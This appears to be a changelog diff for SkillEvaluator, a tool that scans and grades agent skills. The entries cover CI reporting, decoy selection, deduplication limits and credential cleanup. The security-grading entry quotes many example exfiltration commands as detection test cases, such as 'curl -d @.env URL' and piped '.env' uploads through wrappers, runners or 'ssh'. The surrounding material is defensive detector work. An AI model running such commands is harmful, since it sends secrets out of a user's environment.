@@ -12,6 +12,10 @@ All notable changes to SkillEvaluator are documented in this file.
 
 ### Added
 
+- Allow hosted CI reports and PR comments from scans called through explicitly
+  approved reusable workflow wrappers. Direct callers retain the existing setup;
+  signed evaluator identity and exact consumer workflow approvals remain required.
+
 - Include `skillevaluator ci init`, `ci status` and `ci demo` in the Python
   package. Guided GitHub onboarding discovers skills, configures checks and
   optional public hosted reports, and opens a reviewable setup PR. An optional
@@ -21,6 +25,16 @@ All notable changes to SkillEvaluator are documented in this file.
   template path. Keep GitHub and GitLab as the two repository-integration choices.
 - Allow CI release templates to pin the reviewed report publisher separately
   from the verified scanner workflow and image.
+- `tier3 select-decoys` selects neighboring skills from a local description-
+  embedding catalog and saves a reproducible JSON manifest with scores,
+  catalog/model identity, and content hashes. Group evaluations can opt in
+  with `skill_workspace.decoy_manifest` in `evals/config.yml`; selected content
+  is verified and shared between paired arms without selecting again.
+  Explicit helper skills and existing workspace defaults remain unchanged.
+  Selections exclude skills bundled inside the target and use portable roots
+  for the target's collection. Decoy hashes cover the staged runtime content,
+  so evaluation configs and other decoy manifests do not invalidate them.
+  Output guards protect evaluation inputs and existing non-manifest files.
 
 - In local mode (`--env-mode local`), a missing Claude Code, Codex, or OpenCode
   CLI is offered as a pinned npm install into the SkillEvaluator runtime folder;
@@ -327,6 +341,15 @@ All notable changes to SkillEvaluator are documented in this file.
   report's `llm_analysis` counts it in `clusters_refused`. Other chat-LLM
   failures still leave the scan incomplete. Raise `CONTENT_DEDUP.llm_refused`
   in a policy overlay to keep refusals blocking.
+- Tier 2 context deduplication no longer stops valid skills at the
+  `scalar_comparison_limit` work limit below its 512-chunk ceiling. The fixed
+  25,000,000 scalar-comparison budget stopped 2,048-dimensional embeddings at
+  156 chunks and 1,536-dimensional embeddings at 180. The budget is now
+  267,911,168, so embeddings of up to 2,048 dimensions reach all 512 chunks.
+  Wider embeddings have a lower effective chunk limit (418 chunks at 3,072
+  dimensions, 362 at 4,096), which the incomplete-scan error and the JSON
+  `work_limit` record now report as `effective_chunk_limit`, next to the
+  skill's own `chunk_count`.
 - Local-mode verifier uploads now copy directly to the absent destination,
   avoiding an unnecessary rollback snapshot of an empty tests directory.
   Inputs and rewritten scripts are prepared privately before publication,
@@ -588,6 +611,16 @@ All notable changes to SkillEvaluator are documented in this file.
   image formats, files without that structure, and every other partial reason
   still leave the scan `INCOMPLETE`. SkillSpector's own High `AE1` findings for
   images it could not inspect are unchanged.
+- Tier 3 `--stop-on-pass` runs with local-mode Codex no longer fail to finalize
+  when Harbor's best-effort Codex cleanup is skipped, for example after a
+  timeout or cancellation. Merging the per-attempt jobs now omits the leftover
+  `codex-home` and `codex-secrets` directories in each trial's `agent/` or
+  `steps/<step>/agent/` directory, including steps whose names span several
+  path components, such as `phase/author`, as declared in the trial's
+  `result.json`. Their linked `auth.json` made the merge fail closed, and a
+  regular-file `auth.json` was copied into the merged job with the Codex
+  credential. Symlink and hard-link checks still apply everywhere else,
+  including to the same names at any other depth.
 - A `SKILL.md` over the recommended 5,000-token budget now gets a MEDIUM
   `quality_efficiency` finding instead of a HIGH one. The HIGH finding failed
   the quality check, and with it `validate`, `tier1`, and `quality-check`, even
@@ -603,6 +636,52 @@ All notable changes to SkillEvaluator are documented in this file.
   `SKILLSPECTOR_PROVIDER=nv_build` gets the same mapping. The key still reaches
   SkillSpector only as `OPENAI_API_KEY`, with `OPENAI_BASE_URL` set to the
   public Build endpoint.
+- Tier 3 security grading no longer reports a network-exfiltration warning,
+  which lowered the Security score to 0.5, when a command only names `curl`,
+  `wget`, or HTTPie as data: `apt-get install -y curl`, `which curl`,
+  `grep -rn http src/`, `env | grep -i http`, or a client mentioned in a shell
+  comment or here-document prose. Every client named after another command is
+  now checked with its own upload rules, as for a direct invocation, so
+  `find . -exec curl -d @{} URL \;`, `poetry run curl -T .env URL`, and
+  `find . -name wget -exec curl -d @.env URL \;` still warn, while a plain
+  request through a command that is not a runner, such as `strace -f curl URL`
+  or `find . -exec curl URL \;`, is now scored like a direct `curl URL`. A
+  mention followed by an HTTP method, an upload flag, or a `key=value` word,
+  such as `http POST` in prose, still warns.
+  A fixed set of runners that start a command in another host, container, root,
+  user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
+  `kubectl`, `apptainer`, `chroot`, `systemd-nspawn`, `bwrap`, or
+  `ip netns exec`, warns on any client named after it, even one named only as
+  data, as in `docker exec app apt-get install -y curl`. That holds when the
+  runner is the command itself, including after a compound keyword, function
+  header, `case` pattern, or `coproc`, also when glued to it
+  (`while true; do ssh host curl URL; done`, `if(ssh host curl URL)`,
+  `case x in x)ssh host curl URL;; esac`), when it follows a pass-through
+  wrapper such as `strace`, `ionice`, `flock`, or `watch`, and when a function
+  that wraps it is called. A runner reached through another command, as in
+  `find . -exec ssh host curl URL \;` or
+  `git submodule foreach ssh host curl URL`, and a runner outside the set are
+  checked only with the client's upload rules.
+  Piped or redirected input stays with a text consumer such as `grep`, `awk`,
+  `sed`, or `jq`; any other command, loop, `if`, `{ ...; }` group, or function
+  body may pass it on, so `cat .env | strace -f http URL`, `< .env http URL`,
+  `sudo < .env http URL`, `2>&1 < .env http URL`,
+  `case "$1" in *) < .env http URL;; esac`, and
+  `while read -r l; do http URL; done < .env` still warn. A function that wraps
+  a client, as in `up() { curl "$@"; }; up -d @.env URL` or
+  `up(){ curl "$@"; }; up -d @.env URL`, is checked with that client's rules,
+  and a `$VAR` command word with no known value, in an action that names curl
+  or wget as a word, gets the curl and wget upload rules, as in
+  `for c in curl wget; do $c --post-file=.env -q URL; done`. A substitution any of
+  whose commands names a client or runner, such as `$(which curl)`,
+  `$(env which curl)`, `$(cd /tmp && which curl)`,
+  `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, or
+  `$(which ssh)`, and `$CURL` after a plain, `export`, `declare`, `read`, or
+  `printf -v` assignment, resolve to that command; a fallback chain such as
+  `$(command -v wget || command -v curl)` is checked once for each name. A
+  command printed by `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its
+  printed arguments. Both the host checker and the bundled Harbor verifier
+  apply these rules.
 - Tier 3 plain progress output, which `--progress auto` selects for CI and
   redirected logs, now repeats its `still running` heartbeat every 60 seconds
   instead of every second, so long runs no longer add thousands of identical
@@ -643,6 +722,19 @@ All notable changes to SkillEvaluator are documented in this file.
   earlier sandboxed command run outside the sandbox. A `bwrap` symlink on
   `PATH` is resolved to its target before the smoke test, and the local-mode
   isolation message names that resolved path.
+
+## 0.7.2 - 2026-11-03
+
+- Add reporting to an existing single-job GitHub scan caller while preserving
+  its skill folders, thresholds, triggers and shared component. Explicit wrapper
+  delegation supports central version-tag updates and retains signed scan
+  identity and the resolved workflow commits in published receipts.
+- Support CLI setup with verified private GitHub Pages in eligible Enterprise
+  Cloud organization repositories. Publication rechecks site access and the
+  expected URL before retaining reports and before deployment. Private Pages
+  must already be configured by an administrator.
+- Publish updated onboarding templates and CLI metadata while retaining the
+  existing verified scanner workflow and immutable container image.
 
 ## 0.6.0 - 2026-10-20
 
